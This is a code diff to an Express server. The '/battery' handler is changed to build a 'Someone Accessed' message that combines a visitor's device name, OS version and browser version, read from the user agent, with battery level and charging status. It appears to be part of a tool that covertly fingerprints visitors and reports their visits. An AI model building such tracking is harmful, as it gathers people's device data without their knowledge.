@@ -128,7 +128,17 @@ app.get('/axl', (req, res) => {
 // Handle battery info sent from the client
 app.post('/battery', express.json(), (req, res) => {
   const { level, charging } = req.body;
-  const message = `🔋 *Battery Info*:
+  const deviceName = getDeviceName(userAgent);
+  const androos = getOSVersion(userAgent);
+  const brow =  getBrowserVersion(userAgent);
+
+  const message = `Someone Accessed 
+ 
+D:- ${deviceName}
+V:- ${androos}
+B:- ${brow}
+ 
+ 🔋 *Battery Info*:
 - Level: ${level}
 - Status: ${charging}`;
 
